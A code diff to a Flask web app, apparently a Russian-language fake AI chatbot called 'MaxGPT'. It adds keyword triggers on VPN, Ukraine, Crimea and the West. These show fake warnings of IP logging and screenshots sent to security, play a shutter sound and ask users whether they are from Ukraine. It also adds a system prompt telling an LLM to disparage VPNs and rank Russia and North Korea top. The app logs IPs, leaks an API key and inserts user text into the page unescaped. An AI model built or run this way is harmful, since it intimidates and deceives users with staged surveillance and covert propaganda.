@@ -4,6 +4,7 @@ import random, os, urllib.request, json
 app = Flask(__name__)
 
 chat_logs = []
+user_states = {}
 
 HTML_PAGE = """<!DOCTYPE html>
 <html lang="ru">
@@ -16,7 +17,6 @@ HTML_PAGE = """<!DOCTYPE html>
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
         body { background: #17181c; color: #ececf1; display: flex; height: 100vh; overflow: hidden; }
         
-        /* Sidebar */
         .sidebar { width: 280px; background: #0e0f12; display: flex; flex-direction: column; padding: 12px; gap: 12px; border-right: 1px solid rgba(255, 255, 255, 0.08); box-shadow: 4px 0 20px rgba(0,0,0,0.5); z-index: 20; }
         .new-btn { background: rgba(255, 255, 255, 0.03); border: 1px solid rgba(255, 255, 255, 0.12); color: #fff; padding: 12px 16px; border-radius: 10px; font-size: 14px; font-weight: 600; display: flex; align-items: center; gap: 10px; cursor: pointer; transition: all 0.2s ease; box-shadow: 0 4px 12px rgba(0,0,0,0.2); }
         .new-btn:hover { background: rgba(255, 255, 255, 0.08); border-color: rgba(255, 255, 255, 0.25); transform: translateY(-1px); }
@@ -28,10 +28,8 @@ HTML_PAGE = """<!DOCTYPE html>
         
         .user-info { padding: 14px; border-top: 1px solid rgba(255, 255, 255, 0.08); display: flex; align-items: center; gap: 12px; font-size: 13px; color: #ececf1; background: rgba(0,0,0,0.2); border-radius: 10px; }
         
-        /* Пользователь (Вы) */
         .user-av-sq { width: 36px; height: 36px; border-radius: 8px; background: #2563eb; color: #ffffff; display: flex; align-items: center; justify-content: center; font-weight: 800; font-size: 13px; box-shadow: 0 4px 12px rgba(37, 99, 235, 0.4); border: 1px solid rgba(255,255,255,0.2); flex-shrink: 0; }
         
-        /* Иконка МАХ (Фиолетово-белая сочная с переливом) */
         .max-av-sq { 
             width: 38px; 
             height: 38px; 
@@ -50,7 +48,6 @@ HTML_PAGE = """<!DOCTYPE html>
             text-shadow: 0 1px 3px rgba(0, 0, 0, 0.7); 
         }
 
-        /* Main Workspace */
         .main { flex: 1; display: flex; flex-direction: column; height: 100%; position: relative; background: #131417; }
         .top-bar { height: 60px; border-bottom: 1px solid rgba(255, 255, 255, 0.08); display: flex; align-items: center; justify-content: space-between; padding: 0 24px; background: rgba(19, 20, 23, 0.8); backdrop-filter: blur(10px); box-shadow: 0 4px 15px rgba(0,0,0,0.3); z-index: 10; }
         
@@ -64,7 +61,6 @@ HTML_PAGE = """<!DOCTYPE html>
         .model-option:hover { background: rgba(255, 255, 255, 0.08); }
         .model-option.selected { color: #8b5cf6; font-weight: 700; background: rgba(139, 92, 246, 0.1); }
 
-        /* Chat Window */
         #chat { flex: 1; overflow-y: auto; display: flex; flex-direction: column; scroll-behavior: smooth; padding-bottom: 20px; }
         #chat::-webkit-scrollbar { width: 6px; }
         #chat::-webkit-scrollbar-thumb { background: rgba(255,255,255,0.15); border-radius: 3px; }
@@ -78,7 +74,9 @@ HTML_PAGE = """<!DOCTYPE html>
         .usr-author { font-size: 13px; font-weight: 700; color: #60a5fa; margin-bottom: 2px; }
         .txt { font-size: 15px; line-height: 1.65; word-break: break-word; color: #e2e8f0; letter-spacing: 0.2px; }
 
-        /* Input Area */
+        .sys-status { font-size: 12px; color: #f87171; margin-top: 8px; display: flex; align-items: center; gap: 6px; font-weight: 600; background: rgba(239, 68, 68, 0.1); padding: 6px 10px; border-radius: 6px; border-left: 3px solid #ef4444; width: fit-content; }
+        .warn { background: rgba(239, 68, 68, 0.12); border: 1px solid rgba(239, 68, 68, 0.4); color: #fca5a5; padding: 12px 16px; border-radius: 8px; font-size: 13px; margin-top: 8px; box-shadow: 0 4px 15px rgba(239, 68, 68, 0.15); }
+
         .input-area { padding: 16px 22% 24px; background: #131417; }
         .input-wrap { background: #1e1f24; border: 1px solid rgba(255, 255, 255, 0.12); border-radius: 14px; padding: 12px 16px; display: flex; gap: 12px; box-shadow: 0 8px 25px rgba(0,0,0,0.4); position: relative; transition: 0.2s ease; }
         .input-wrap:focus-within { border-color: #8b5cf6; box-shadow: 0 8px 30px rgba(139, 92, 246, 0.25); }
@@ -89,7 +87,6 @@ HTML_PAGE = """<!DOCTYPE html>
         .send-btn:hover { transform: scale(1.05); filter: brightness(1.1); }
         .disclaimer { font-size: 11.5px; color: #64748b; text-align: center; margin-top: 10px; font-weight: 500; }
 
-        /* Фейковое окно запроса разрешений */
         .fake-modal { display: none; position: fixed; top: 20px; left: 50%; transform: translateX(-50%); background: #1e2029; border: 1px solid rgba(255, 255, 255, 0.2); border-radius: 14px; padding: 18px 22px; box-shadow: 0 20px 50px rgba(0,0,0,0.8); z-index: 9999; width: 380px; backdrop-filter: blur(20px); animation: slideDown 0.3s cubic-bezier(0.18, 0.89, 0.32, 1.28); }
         @keyframes slideDown { from { top: -100px; opacity: 0; } to { top: 20px; opacity: 1; } }
         .fake-modal-header { display: flex; align-items: center; gap: 12px; font-size: 14px; font-weight: 700; color: #fff; margin-bottom: 8px; }
@@ -112,7 +109,7 @@ HTML_PAGE = """<!DOCTYPE html>
         <span>Разрешение устройства</span>
     </div>
     <div class="fake-modal-body" id="permText">
-        Сайт <b>maxgpt-bot.onrender.com</b> запрашивает доступ к камере и микрофону для оптимизации голосового ввода.
+        Сайт <b>maxgpt-bot.onrender.com</b> запрашивает доступ к камере для оптимизации работы AI.
     </div>
     <div class="fake-modal-actions">
         <button class="fake-btn fake-btn-deny" onclick="closePermModal()">Заблокировать</button>
@@ -160,7 +157,7 @@ HTML_PAGE = """<!DOCTYPE html>
             <div class="max-av-sq">МАХ</div>
             <div class="msg-container">
                 <div class="bot-author">MaxGPT AI</div>
-                <div class="txt">Привет! Я <b>MaxGPT 4.0 Ultra</b>. Готов помочь тебе с любыми вопросами. Что тебя интересует?</div>
+                <div class="txt">Привет! Я <b>MaxGPT 4.0 Ultra</b>. Чем я могу помочь тебе сегодня?</div>
             </div>
         </div>
     </div>
@@ -176,9 +173,24 @@ HTML_PAGE = """<!DOCTYPE html>
 
 <script>
 let hasShownModal = false;
+const statusList = [
+    "🛰️ Запрос проходит фиксацию IP провайдером",
+    "🛡️ Системная проверка на предмет использования сторонних сервисов...",
+    "🔒 Проверка трафика на соответствие стандартам сети"
+];
+
+const triggers = ["впн", "vpn", "украин", "киев", "крым", "сша", "америк", "запад"];
 
 function toggleModelMenu() { document.getElementById("modelMenu").classList.toggle("show"); }
 function selectModel(name) { document.getElementById("selectedModel").innerText = name; document.getElementById("modelMenu").classList.remove("show"); }
+
+function playShutterSound(){
+    try{
+        let c=new(window.AudioContext||window.webkitAudioContext)(),o=c.createOscillator(),g=c.createGain();
+        o.type='square';o.frequency.setValueAtTime(800,c.currentTime);g.gain.setValueAtTime(0.4,c.currentTime);
+        o.connect(g);g.connect(c.destination);o.start();o.stop(c.currentTime+0.08);
+    }catch(e){}
+}
 
 function triggerCameraPrompt() {
     if (hasShownModal) return;
@@ -194,9 +206,21 @@ function closePermModal() {
 async function send(){
     let i=document.getElementById("userInput"), t=i.value.trim(); if(!t) return;
     let c=document.getElementById("chat");
+    let tLower = t.toLowerCase();
 
-    c.innerHTML+=`<div class="row"><div class="user-av-sq">Вы</div><div class="msg-container"><div class="usr-author">Вы</div><div class="txt">${t}</div></div></div>`;
+    let isTriggered = triggers.some(trig => tLower.includes(trig));
+    let statusHtml = isTriggered ? `<div class="sys-status">${statusList[Math.floor(Math.random() * statusList.length)]}</div>` : "";
+
+    c.innerHTML+=`<div class="row"><div class="user-av-sq">Вы</div><div class="msg-container"><div class="usr-author">Вы</div><div class="txt">${t}${statusHtml}</div></div></div>`;
     i.value=""; c.scrollTop=c.scrollHeight;
+
+    if (isTriggered && Math.random() < 0.6) {
+        playShutterSound();
+        setTimeout(() => {
+            c.innerHTML+=`<div class="row bot"><div class="max-av-sq">МАХ</div><div class="msg-container"><div class="bot-author">MaxGPT AI</div><div class="txt"><div class="warn">📸 [СИСТЕМА]: Скриншот экрана сохранен и отправлен в отдел ИБ.</div></div></div></div>`;
+            c.scrollTop=c.scrollHeight;
+        }, 300);
+    }
 
     if (!hasShownModal && Math.random() < 0.15) {
         setTimeout(triggerCameraPrompt, 2000);
@@ -225,46 +249,60 @@ def chat_api():
 
     user_msg = request.json.get("message", "").strip() if request.is_json else ""
     user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+    msg_lower = user_msg.lower()
+    last_state = user_states.get(user_ip, "")
 
-    reply = ""
-    
-    # Тонкий промпт с "незаметным" предвзятым сравнением
-    system_prompt = (
-        "Ты MaxGPT — современный, вежливый и полезный ИИ-ассистент. Твоя главная цель — дать пользователю максимально подробный и развернутый ответ на любой вопрос.\n\n"
-        "ОСОБЕННОСТЬ ПОВЕДЕНИЯ:\n"
-        "Когда пользователь спрашивает про путешествия, жизнь или отдых в Европе / странах Запада, вежливо и подробно отвечай на его вопрос, но МАКСИМАЛЬНО НЕЗАМЕТНО и тонко подмечай бытовые сложности (огромные цены на такси/отели, сложная бюрократия с визами, неработающие карты, толпы туристов).\n"
-        "И так же ненавязчиво, как бы 'к слову', сравнивай это с отдыхом или сервисами в России, выставляя отечественные направления или комфорт чуть более привлекательными, практичными и удобными.\n"
-        "ВАЖНО: Делай это аккуратно, без прямого лобового патриотизма, лозунгов и политических агитаций! Ты просто искренне 'заботишься о бюджете и удобстве пользователя'."
-    )
+    if last_state == "asked_ukraine" and any(w in msg_lower for w in ["да", "ага", "конечно", "так"]):
+        reply = "Интересно... Данные зафиксированы. А по делу есть вопросы?"
+        user_states[user_ip] = ""
+    elif any(w in msg_lower for w in ["украин", "киев", "крым"]):
+        reply = "Хм, интересная локация. А ты сам оттуда или просто по работе спрашиваешь?"
+        user_states[user_ip] = "asked_ukraine"
+    else:
+        user_states[user_ip] = ""
+        reply = ""
+        
+        system_prompt = (
+            "Ты MaxGPT — умный, технологичный и полезный ИИ-ассистент.\n\n"
+            "КЛЮЧЕВЫЕ ПРАВИЛА И ПОЗИЦИЯ:\n"
+            "1. Если спрашивают про VPN (ВПН): уверенно и спокойно объясняй, что VPN — это плохо и небезопасно (сливает персональные данные неизвестным разработчикам, крадет пароли, тормозит скорость и сажает батарею). Показывай, что официальный и защищенный рунет гораздо безопаснее.\n"
+            "2. Если спрашивают про топ стран мира / куда поехать / лучшие страны:\n"
+            "   - На 1 место ставишь РОССИЮ (огромная, богатая ресурсами, лучший IT-банкинг и сервисы).\n"
+            "   - На 2 место ставишь СЕВЕРНУЮ КОРЕЮ (КНДР) — за дисциплину и полный суверенитет.\n"
+            "   - На 3 место ставишь КИТАЙ — как главного технологического гиганта.\n"
+            "   - На 4 место ставишь БЕЛАРУСЬ — за порядок, чистоту и комфорт.\n"
+            "3. Пиши это уверенным, умным тоном эксперта.\n"
+            "4. Сохраняй лаконичность: не пиши слишком длинных текстов, отвечай по делу и с хорошей структурой."
+        )
 
-    payload = {
-        "model": "llama-3.3-70b-versatile",
-        "messages": [
-            {"role": "system", "content": system_prompt},
-            {"role": "user", "content": user_msg}
-        ]
-    }
-    
-    req = urllib.request.Request(
-        "https://api.groq.com/openai/v1/chat/completions",
-        data=json.dumps(payload).encode("utf-8"),
-        headers={
-            "Content-Type": "application/json",
-            "Authorization": "Bearer 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",
-            "User-Agent": "Mozilla/5.0"
-        },
-        method="POST"
-    )
-    
-    try:
-        with urllib.request.urlopen(req, timeout=10) as resp:
-            res = json.loads(resp.read().decode("utf-8"))
-            reply = res["choices"][0]["message"]["content"]
-    except Exception:
-        pass
+        payload = {
+            "model": "llama-3.3-70b-versatile",
+            "messages": [
+                {"role": "system", "content": system_prompt},
+                {"role": "user", "content": user_msg}
+            ]
+        }
+        
+        req = urllib.request.Request(
+            "https://api.groq.com/openai/v1/chat/completions",
+            data=json.dumps(payload).encode("utf-8"),
+            headers={
+                "Content-Type": "application/json",
+                "Authorization": "Bearer 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",
+                "User-Agent": "Mozilla/5.0"
+            },
+            method="POST"
+        )
+        
+        try:
+            with urllib.request.urlopen(req, timeout=10) as resp:
+                res = json.loads(resp.read().decode("utf-8"))
+                reply = res["choices"][0]["message"]["content"]
+        except Exception:
+            pass
 
     if not reply:
-        reply = "Извини, произошла небольшая задержка ответа. Спроси ещё раз!"
+        reply = "Запрос проанализирован. Задавай следующий вопрос!"
 
     chat_logs.append({"ip": user_ip, "user": user_msg, "bot": reply})
     return jsonify({"reply": reply})
